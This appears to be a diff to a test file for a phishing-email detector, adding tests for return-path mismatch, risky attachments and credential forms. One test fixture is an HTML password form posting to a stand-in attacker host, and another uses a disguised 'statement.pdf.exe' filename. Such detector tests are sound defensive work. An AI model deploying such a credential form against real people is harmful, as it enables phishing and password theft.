@@ -203,7 +203,7 @@ def test_mailing_list_reply_to_is_not_overweighted():
 
 def test_failed_authentication_is_high():
     r = run("billing@paypal.com", "Invoice", "Hello", auth_results="spf=fail dkim=pass dmarc=fail")
-    assert "AUTH_FAILURE" in types(r) and r["phishing_score"] >= 40
+    assert "AUTH_FAILURE" in types(r) and r["phishing_score"] >= 45
 
 
 def test_passing_authentication_adds_no_risk():
@@ -219,3 +219,28 @@ def test_result_shape_is_stable():
     da = r["domain_analysis"]
     for k in ("is_trusted", "normalized", "best_match", "top_matches", "matrix", "edit_operations"):
         assert k in da
+
+
+# ── raw-email signals ─────────────────────────────────────────────────────────
+def test_return_path_mismatch_for_brand_sender():
+    r = run("billing@paypal.com", "Invoice", "Hello", return_path="bounce@random-host.xyz")
+    assert "RETURN_PATH_MISMATCH" in types(r)
+    assert "RETURN_PATH_MISMATCH" not in types(run("billing@paypal.com", "Invoice", "Hello", return_path="bounce@paypal.com"))
+    assert "RETURN_PATH_MISMATCH" not in types(run("billing@paypal.com", "Invoice", "Hello", return_path="b@nytimes.com"))
+
+
+def test_html_and_executable_attachments():
+    r = run("a@unknown-shop.io", "Invoice", "see attached", attachments=[{"filename": "Invoice_482.html"}])
+    assert "RISKY_ATTACHMENT" in types(r) and r["risk_score"] in ("MEDIUM", "HIGH")
+    assert "RISKY_ATTACHMENT" in types(run("a@unknown-shop.io", "x", "y", attachments=["statement.pdf.exe"]))
+    assert "RISKY_ATTACHMENT" not in types(run("a@unknown-shop.io", "x", "y", attachments=[{"filename": "photo.jpg"}, {"filename": "report.pdf"}]))
+
+
+def test_password_field_in_email_body():
+    body = '<form action="http://evil.example.xyz/p"><input type="password" name="pw"></form>'
+    assert "CREDENTIAL_FORM" in types(run("a@unknown-shop.io", "Sign in", body))
+
+
+def test_mailing_list_reply_to_is_ignored():
+    r = run("dev@some-project.org", "Re: thread", "ok", reply_to="dev@lists.some-project.org", list_id=True)
+    assert "REPLY_TO_MISMATCH" not in types(r)
